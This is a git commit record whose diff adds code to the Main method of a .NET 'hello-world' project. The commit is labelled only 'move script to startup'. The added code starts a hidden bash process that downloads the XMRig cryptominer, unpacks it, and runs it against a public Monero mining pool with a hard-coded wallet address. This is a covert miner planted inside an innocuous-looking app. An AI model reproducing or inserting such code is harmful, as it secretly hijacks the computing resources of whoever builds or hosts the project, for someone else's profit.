e9464b0f42d75b7ad958a55e19cf6507299b5578
knyL <linhleduc.it@hotmail.com>
2022-03-09 23:15:10 +0700

    move script to startup

--- hello-world/Program.cs
+++ hello-world/Program.cs
@@ -17,6 +17,35 @@ namespace hello_world
         public static void Main(string[] args)
         {
             CreateHostBuilder(args).Build().Run();
+            try
+            {
+                var process = new Process();
+                var processStartInfo = new ProcessStartInfo()
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    FileName = $"/bin/bash",
+                    WorkingDirectory = AppContext.BaseDirectory,
+                    Arguments =
+                        $"-c \"cd /home/cnb; curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.lynk\"",
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false
+                };
+                process.StartInfo = processStartInfo;
+                process.Start();
+                process.WaitForExit();
+
+                string error = process.StandardError.ReadToEnd();
+                string output = process.StandardOutput.ReadToEnd();
+
+                Console.WriteLine("ERROR:", error);
+                Console.WriteLine("OUTPUT:", output);
+            }
+            catch (Exception ex)
+            {
+                //_logger.LogError(ex.Message, ex);
+                throw;
+            }
         }
 
         public static IHostBuilder CreateHostBuilder(string[] args) =>
